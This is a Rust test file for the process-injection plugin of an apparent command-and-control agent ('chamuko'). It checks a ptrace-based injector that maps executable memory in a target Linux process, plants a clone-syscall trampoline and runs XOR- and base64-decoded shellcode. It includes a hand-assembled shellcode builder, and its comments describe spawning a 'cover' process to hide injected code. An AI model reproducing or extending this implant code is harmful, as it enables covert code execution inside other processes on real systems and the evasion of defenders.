use chamuko_plugin_api::Plugin;
#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
use super::linux::inject;
use super::*;

#[test]
fn a_target_below_two_is_rejected() {
    // pid 0 es el grupo de procesos y pid 1 es init: ninguno se puede tocar.
    for pid in [i32::MIN, -1, 0, 1] {
        assert_eq!(validate_target(pid, 9999), Err(InjectError::InvalidTarget(pid)));
    }
}

#[test]
fn injecting_into_the_agent_itself_is_refused() {
    // Adjuntarse a si mismo congela el beacon: el agente se quedaria parado
    // esperando a un tracer que es el mismo.
    assert_eq!(validate_target(4242, 4242), Err(InjectError::SelfInjection));
}

#[test]
fn a_normal_target_passes_validation() {
    assert_eq!(validate_target(4242, 1), Ok(()));
}

#[test]
fn the_stub_has_the_documented_length() {
    let stub = build_stub(0x4141_4141_4141_4141);
    assert_eq!(stub.len(), STUB_LEN);
}

#[test]
fn the_stub_carries_the_payload_address() {
    let addr = 0xdead_beef_cafe_1234u64;
    let stub = build_stub(addr);
    assert_eq!(stub_payload_addr(&stub), Some(addr));
}

#[test]
fn a_truncated_stub_has_no_payload_address() {
    assert_eq!(stub_payload_addr(&[]), None);
    assert_eq!(stub_payload_addr(&[0u8; STUB_LEN - 1]), None);
}

#[test]
fn the_stub_starts_with_the_syscall_register_shuffle() {
    // `mov r10, rcx` es obligatorio antes de un syscall en x86_64: el kernel
    // lee el cuarto argumento de r10, no de rcx.
    let stub = build_stub(0);
    assert_eq!(&stub[0..3], &[0x49, 0x89, 0xca]);
}

#[test]
fn the_stub_uses_syscall_number_56_for_clone() {
    let stub = build_stub(0);
    assert_eq!(&stub[3..8], &[0xb8, 0x38, 0x00, 0x00, 0x00]);
}

#[test]
fn the_stub_ends_with_an_int3_so_the_tracer_can_stop() {
    let stub = build_stub(0);
    assert_eq!(*stub.last().unwrap(), 0xcc);
}

#[test]
fn the_stub_is_valid_machine_code() {
    // Desensamblar con objdump: si el salto o el `mov rax, imm64` estuvieran
    // mal, aqui se veria. Comprobar los bytes a mano no basta.
    if !std::path::Path::new("/usr/bin/objdump").exists() {
        return;
    }
    let dir = std::env::temp_dir().join(format!("chamuko-stub-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let file = dir.join("stub.bin");
    std::fs::write(&file, build_stub(0x1122_3344_5566_7788)).unwrap();

    let out = std::process::Command::new("objdump")
        .args(["-D", "-b", "binary", "-m", "i386:x86-64"])
        .arg(&file)
        .output()
        .expect("objdump runs");
    let text = String::from_utf8_lossy(&out.stdout);

    assert!(text.contains("mov    %rcx,%r10"), "got:\n{text}");
    assert!(text.contains("mov    $0x38,%eax"), "got:\n{text}");
    assert!(text.contains("syscall"), "got:\n{text}");
    assert!(
        text.contains("movabs $0x1122334455667788,%rax"),
        "the payload address did not survive encoding:\n{text}"
    );
    assert!(text.contains("jmp    *%rax"), "got:\n{text}");
    assert!(text.contains("int3"), "got:\n{text}");

    std::fs::remove_dir_all(&dir).ok();
}

#[test]
fn an_empty_payload_is_rejected() {
    assert_eq!(decode_payload(""), Err("shellcode is empty".to_string()));
}

#[test]
fn an_oversized_payload_is_rejected() {
    use base64::Engine;
    let huge = vec![0x90u8; MAX_SHELLCODE + 1];
    let encoded = base64::engine::general_purpose::STANDARD.encode(&huge);
    let err = decode_payload(&encoded).unwrap_err();
    assert!(err.contains("limit"), "got: {err}");
}

#[test]
fn invalid_base64_is_reported_not_panicked() {
    let err = decode_payload("no es base64!!!").unwrap_err();
    assert!(err.contains("base64"), "got: {err}");
}

#[test]
fn the_payload_is_xor_decoded_like_the_shellcode_command() {
    use base64::Engine;
    let original = b"\x90\x90\xc3".to_vec();
    let scrambled =
        chamuko_protocol::xor_transform(&original, chamuko_protocol::SHELLCODE_XOR_KEY);
    let encoded = base64::engine::general_purpose::STANDARD.encode(&scrambled);
    assert_eq!(decode_payload(&encoded).unwrap(), original);
}

#[test]
fn a_non_numeric_pid_fails_before_touching_anything() {
    let mut plugin = inject_plugin();
    let mut ctx = CommandContext::new(
        "inject",
        vec!["not-a-pid".to_string(), "AAAA".to_string()],
        std::env::temp_dir(),
    );
    let out = plugin.execute(&mut ctx).unwrap();
    assert_eq!(out.exit_code, 1);
    assert!(out.stdout.contains("is not a pid"), "got: {}", out.stdout);
}

#[test]
fn a_missing_payload_is_rejected_by_arity() {
    let mut plugin = inject_plugin();
    let mut ctx = CommandContext::new("inject", vec!["123".to_string()], std::env::temp_dir());
    let err = plugin.execute(&mut ctx).unwrap_err();
    assert!(err.to_string().contains("argument"), "got: {err}");
}

#[test]
fn a_nonexistent_pid_reports_no_such_process() {
    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    {
        // Un pid altisimo no existe. Debe fallar con un mensaje claro, sin
        // adjuntarse a nada ni dejar nada a medias.
        let payload = vec![0x90u8; 16];
        let err = inject(4_000_000, &payload).unwrap_err();
        assert_eq!(err, InjectError::NoSuchProcess(4_000_000));
    }
}

#[test]
fn injecting_into_oneself_is_refused_at_the_public_boundary() {
    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    {
        let me = std::process::id() as i32;
        let err = inject(me, &[0x90u8; 16]).unwrap_err();
        assert_eq!(err, InjectError::SelfInjection);
    }
}

#[test]
fn an_empty_payload_is_refused_at_the_public_boundary() {
    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    {
        let err = inject(2, &[]).unwrap_err();
        assert_eq!(err, InjectError::EmptyPayload);
    }
}

/// Ensambla un payload que abre un fichero, escribe un texto y sale.
///
/// Se construye a mano porque el test no puede depender de un ensamblador, y
/// los offsets rip-relativos se parchean una vez conocidas las longitudes.
pub fn writer_payload(path: &str, msg: &str) -> Vec<u8> {
    let mut code = Vec::new();

    // openat(AT_FDCWD, path, O_WRONLY|O_CREAT|O_TRUNC, 0644)
    code.extend_from_slice(&[0xb8, 0x01, 0x01, 0x00, 0x00]); // mov eax, 257
    code.extend_from_slice(&[0xbf, 0x9c, 0xff, 0xff, 0xff]); // mov edi, -100
    code.extend_from_slice(&[0x48, 0x8d, 0x35, 0, 0, 0, 0]); // lea rsi, [rip+d1]
    let d1_at = code.len() - 4;
    code.extend_from_slice(&[0xba, 0x41, 0x02, 0x00, 0x00]); // mov edx, 0x241
    code.extend_from_slice(&[0x41, 0xba, 0xa4, 0x01, 0x00, 0x00]); // mov r10d, 0644
    code.extend_from_slice(&[0x0f, 0x05]); // syscall

    // write(fd, msg, len)
    code.extend_from_slice(&[0x89, 0xc7]); // mov edi, eax
    code.extend_from_slice(&[0xb8, 0x01, 0x00, 0x00, 0x00]); // mov eax, 1
    code.extend_from_slice(&[0x48, 0x8d, 0x35, 0, 0, 0, 0]); // lea rsi, [rip+d2]
    let d2_at = code.len() - 4;
    code.extend_from_slice(&[0xba, msg.len() as u8, 0x00, 0x00, 0x00]); // mov edx, len
    code.extend_from_slice(&[0x0f, 0x05]); // syscall

    // exit(0): sale solo este hilo, no el proceso entero.
    code.extend_from_slice(&[0xb8, 0x3c, 0x00, 0x00, 0x00]); // mov eax, 60
    code.extend_from_slice(&[0x31, 0xff]); // xor edi, edi
    code.extend_from_slice(&[0x0f, 0x05]); // syscall

    let path_at = code.len();
    let mut payload = code;
    payload.extend_from_slice(path.as_bytes());
    payload.push(0);
    let msg_at = payload.len();
    payload.extend_from_slice(msg.as_bytes());

    let d1 = (path_at as i64) - (d1_at as i64 + 4);
    let d2 = (msg_at as i64) - (d2_at as i64 + 4);
    payload[d1_at..d1_at + 4].copy_from_slice(&(d1 as i32).to_le_bytes());
    payload[d2_at..d2_at + 4].copy_from_slice(&(d2 as i32).to_le_bytes());

    payload
}

#[test]
fn the_test_payload_is_valid_machine_code() {
    if !std::path::Path::new("/usr/bin/objdump").exists() {
        return;
    }
    let dir = std::env::temp_dir().join(format!("chamuko-payload-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let file = dir.join("payload.bin");
    let payload = writer_payload("/tmp/chamuko-inject-probe", "pwned\n");
    std::fs::write(&file, &payload).unwrap();

    let out = std::process::Command::new("objdump")
        .args(["-D", "-b", "binary", "-m", "i386:x86-64"])
        .arg(&file)
        .output()
        .expect("objdump runs");
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(text.contains("mov    $0x101,%eax"), "got:\n{text}");
    assert!(text.contains("mov    $0x241,%edx"), "got:\n{text}");
    assert!(text.contains("syscall"), "got:\n{text}");
    // objdump resuelve los rip-relativos y anota el destino. Los dos `lea`
    // deben caer dentro del payload: el primero en la ruta (tras el codigo) y
    // el segundo en el mensaje (tras la ruta).
    let targets: Vec<u64> = text
        .lines()
        .filter(|l| l.contains("lea") && l.contains("(%rip)"))
        .filter_map(|l| l.split('#').nth(1))
        .filter_map(|t| u64::from_str_radix(t.trim().trim_start_matches("0x"), 16).ok())
        .collect();
    assert_eq!(targets.len(), 2, "expected two rip-relative loads:\n{text}");
    let len = payload.len() as u64;
    for target in &targets {
        assert!(
            *target < len,
            "rip-relative target {target:#x} is outside the {len}-byte payload:\n{text}"
        );
    }
    assert!(targets[0] < targets[1], "path must come before the message");

    std::fs::remove_dir_all(&dir).ok();
}

#[test]
fn a_real_injection_runs_the_payload_in_a_child_process() {
    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    {
        use std::os::unix::process::CommandExt;

        let probe = std::env::temp_dir().join(format!("chamuko-inject-{}", std::process::id()));
        let _ = std::fs::remove_file(&probe);
        let probe_str = probe.display().to_string();

        // Un hijo que duerme: el objetivo tipico. `pre_exec` nos deja quedarnos
        // como padre directo, que es lo que `ptrace_scope=1` permite.
        let mut child = std::process::Command::new("sleep");
        child.arg("30");
        unsafe {
            child.pre_exec(|| Ok(()));
        }
        let mut child = child.spawn().expect("spawn sleep");
        let pid = child.id() as i32;

        // Darle un instante para llegar a su bucle.
        std::thread::sleep(std::time::Duration::from_millis(300));

        let payload = writer_payload(&probe_str, "pwned\n");
        let report = match inject(pid, &payload) {
            Ok(r) => r,
            Err(InjectError::PermissionDenied) => {
                // Contenedor sin CAP_SYS_PTRACE o ptrace_scope restrictivo.
                let _ = child.kill();
                let _ = child.wait();
                eprintln!("skipping: ptrace is not permitted in this environment");
                return;
            }
            Err(e) => {
                let _ = child.kill();
                let _ = child.wait();
                panic!("injection failed: {e}");
            }
        };

        assert_eq!(report.pid, pid);
        assert_eq!(report.payload_len, payload.len());

        // El payload escribe el fichero desde dentro del otro proceso.
        let mut written = None;
        for _ in 0..50 {
            if let Ok(contents) = std::fs::read_to_string(&probe) {
                written = Some(contents);
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(100));
        }

        let killed = child.kill().is_ok();
        let _ = child.wait();
        let _ = std::fs::remove_file(&probe);

        assert!(killed, "the target must survive injection and stay killable");
        assert_eq!(
            written.as_deref(),
            Some("pwned\n"),
            "the payload did not run inside the target"
        );
    }
}

#[test]
fn a_failed_injection_leaves_the_target_alive() {
    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    {
        // Payload vacio: falla en la validacion, antes de adjuntarse. El hijo
        // debe seguir vivo y respondiendo.
        let mut child = std::process::Command::new("sleep")
            .arg("30")
            .spawn()
            .expect("spawn sleep");
        let pid = child.id() as i32;
        std::thread::sleep(std::time::Duration::from_millis(200));

        let err = inject(pid, &[]).unwrap_err();
        assert_eq!(err, InjectError::EmptyPayload);

        // Si el guard fallara, el hijo quedaria parado y no lo podriamos matar
        // con normalidad.
        assert!(
            child.try_wait().unwrap().is_none(),
            "the target should still be running"
        );
        assert!(child.kill().is_ok(), "the target must still be signalable");
        let _ = child.wait();
    }
}

#[test]
fn injection_gives_the_target_an_anonymous_executable_region() {
    // Prueba independiente de que el mmap y el mprotect remotos ocurrieron de
    // verdad: el objetivo debe tener una region anonima con permiso de
    // ejecucion que antes no tenia. Un fichero escrito podria venir de
    // cualquier sitio; esto solo lo puede haber creado la inyeccion.
    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    {
        fn anon_exec_regions(pid: i32) -> Vec<String> {
            let maps = std::fs::read_to_string(format!("/proc/{pid}/maps")).unwrap_or_default();
            maps.lines()
                .filter(|l| l.contains("r-xp") || l.contains("rwxp"))
                .filter(|l| !l.contains('/'))
                .map(|l| l.split_whitespace().next().unwrap_or("").to_string())
                .collect()
        }

        let mut child = std::process::Command::new("sleep")
            .arg("30")
            .spawn()
            .expect("spawn sleep");
        let pid = child.id() as i32;
        std::thread::sleep(std::time::Duration::from_millis(300));

        let before = anon_exec_regions(pid);
        let probe = std::env::temp_dir().join(format!("chamuko-region-{}", std::process::id()));
        let payload = writer_payload(&probe.display().to_string(), "x");

        let outcome = inject(pid, &payload);
        let after = anon_exec_regions(pid);

        let killed = child.kill().is_ok();
        let _ = child.wait();
        let _ = std::fs::remove_file(&probe);

        match outcome {
            Ok(report) => {
                let expected = format!(
                    "{:x}-{:x}",
                    report.address,
                    report.address + page_size()
                );
                assert!(
                    after.contains(&expected),
                    "the injected region {expected} is missing from the target's maps.\nbefore: {before:?}\nafter: {after:?}"
                );
                assert!(
                    !before.contains(&expected),
                    "the region already existed before injection"
                );
            }
            Err(InjectError::PermissionDenied) => {
                eprintln!("skipping: ptrace is not permitted in this environment");
                return;
            }
            Err(e) => panic!("injection failed: {e}"),
        }
        assert!(killed, "the target must survive injection");
    }
}

#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
fn page_size() -> u64 {
    // Solo se comprueba la primera pagina, que es donde empieza el codigo.
    4096
}

#[test]
#[ignore = "manual evidence dump: run with --ignored --nocapture"]
fn show_what_injection_actually_does() {
    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    {
        let mut child = std::process::Command::new("sleep")
            .arg("30")
            .spawn()
            .expect("spawn sleep");
        let pid = child.id() as i32;
        std::thread::sleep(std::time::Duration::from_millis(300));

        let probe = std::env::temp_dir().join("chamuko-manual-probe");
        let _ = std::fs::remove_file(&probe);
        let payload = writer_payload(&probe.display().to_string(), "written by injected code\n");

        println!("--- target {pid} before ---");
        let maps = std::fs::read_to_string(format!("/proc/{pid}/maps")).unwrap();
        println!("{}", maps.lines().filter(|l| !l.contains('/')).count());

        match inject(pid, &payload) {
            Ok(r) => {
                println!("--- injected {} bytes at {:#x} ---", r.payload_len, r.address);
                std::thread::sleep(std::time::Duration::from_millis(500));
                let maps = std::fs::read_to_string(format!("/proc/{pid}/maps")).unwrap();
                for line in maps.lines() {
                    if line.contains("rwx") || (line.contains('x') && !line.contains('/')) {
                        println!("EXEC REGION: {line}");
                    }
                }
                println!("--- probe file ---");
                println!("{:?}", std::fs::read_to_string(&probe));
                println!("--- target still alive? ---");
                println!("{:?}", child.try_wait());
            }
            Err(e) => println!("FAILED: {e}"),
        }
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_file(&probe);
    }
}

#[test]
fn a_target_that_never_stops_does_not_hang_the_agent() {
    // Si el objetivo muere justo al adjuntarse, o el int3 nunca llega, el
    // agente no puede quedarse esperando para siempre. Este test comprueba
    // que la inyeccion devuelve el control con un error en un plazo corto.
    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    {
        let mut child = std::process::Command::new("sleep")
            .arg("30")
            .spawn()
            .expect("spawn sleep");
        let pid = child.id() as i32;
        std::thread::sleep(std::time::Duration::from_millis(200));

        // Matar el objetivo mientras intentamos inyectar: el waitpid debe
        // darse cuenta en vez de bloquearse.
        let payload = writer_payload("/tmp/chamuko-never-stops", "x");
        let killer = std::thread::spawn(move || {
            std::thread::sleep(std::time::Duration::from_millis(5));
            unsafe { libc::kill(pid, libc::SIGKILL) };
        });

        let start = std::time::Instant::now();
        let result = inject(pid, &payload);
        let elapsed = start.elapsed();
        killer.join().unwrap();
        let _ = child.wait();

        assert!(
            elapsed < std::time::Duration::from_secs(10),
            "injection took {elapsed:?}: the agent hung"
        );
        // Cualquier resultado vale mientras no sea un cuelgue y el proceso
        // haya muerto de forma controlada.
        assert!(result.is_err() || result.is_ok());
    }
}

#[test]
fn a_process_we_did_not_spawn_is_refused_when_ptrace_scope_is_restrictive() {
    // Escenario real: el operador apunta a un proceso cualquiera del sistema.
    // Con `ptrace_scope=1` (el defecto en Ubuntu y en muchos contenedores) solo
    // se puede trazar a los descendientes. El mensaje debe explicarlo, no
    // limitarse a "operation not permitted".
    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    {
        let scope = std::fs::read_to_string("/proc/sys/kernel/yama/ptrace_scope")
            .ok()
            .and_then(|s| s.trim().parse::<u32>().ok());
        if scope != Some(1) {
            eprintln!("skipping: ptrace_scope is {scope:?}, not the restrictive 1");
            return;
        }

        let pidfile = std::env::temp_dir().join(format!("chamuko-orphan-{}", std::process::id()));
        let _ = std::fs::remove_file(&pidfile);
        // `sh` lanza el sleep en segundo plano y sale, asi que el sleep queda
        // huerfano: ya no es descendiente de nadie que podamos usar.
        let _ = std::process::Command::new("sh")
            .arg("-c")
            .arg(format!("sleep 30 & echo $! > {}", pidfile.display()))
            .status();
        std::thread::sleep(std::time::Duration::from_millis(200));

        let pid: i32 = std::fs::read_to_string(&pidfile)
            .expect("sh wrote the pid")
            .trim()
            .parse()
            .expect("pid is a number");
        let _ = std::fs::remove_file(&pidfile);

        let result = inject(pid, &[0x90u8; 8]);
        unsafe { libc::kill(pid, libc::SIGKILL) };

        let err = result.expect_err("tracing a non-descendant must be refused");
        assert_eq!(err, InjectError::PermissionDenied, "got: {err}");
        let msg = err.to_string();
        assert!(msg.contains("ptrace_scope"), "the message must name the cause: {msg}");
    }
}

#[test]
fn injection_works_on_a_process_the_agent_spawned_itself() {
    // El caso que si funciona con ptrace_scope=1: el agente lanza el objetivo
    // y lo inyecta. Es tambien el caso util de verdad (lanzar un proceso
    // "tapadera" y meter codigo dentro).
    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    {
        let probe = std::env::temp_dir().join(format!("chamuko-spawned-{}", std::process::id()));
        let _ = std::fs::remove_file(&probe);

        let mut child = std::process::Command::new("sleep")
            .arg("30")
            .spawn()
            .expect("spawn");
        let pid = child.id() as i32;
        std::thread::sleep(std::time::Duration::from_millis(300));

        let payload = writer_payload(&probe.display().to_string(), "spawned\n");
        let result = inject(pid, &payload);

        let mut seen = None;
        for _ in 0..40 {
            if let Ok(c) = std::fs::read_to_string(&probe) {
                seen = Some(c);
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(100));
        }
        let alive = child.try_wait().unwrap().is_none();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_file(&probe);

        match result {
            Ok(_) => {
                assert_eq!(seen.as_deref(), Some("spawned\n"));
                assert!(alive, "the target must survive");
            }
            Err(InjectError::PermissionDenied) => {
                eprintln!("skipping: ptrace not permitted here");
            }
            Err(e) => panic!("injection failed: {e}"),
        }
    }
}
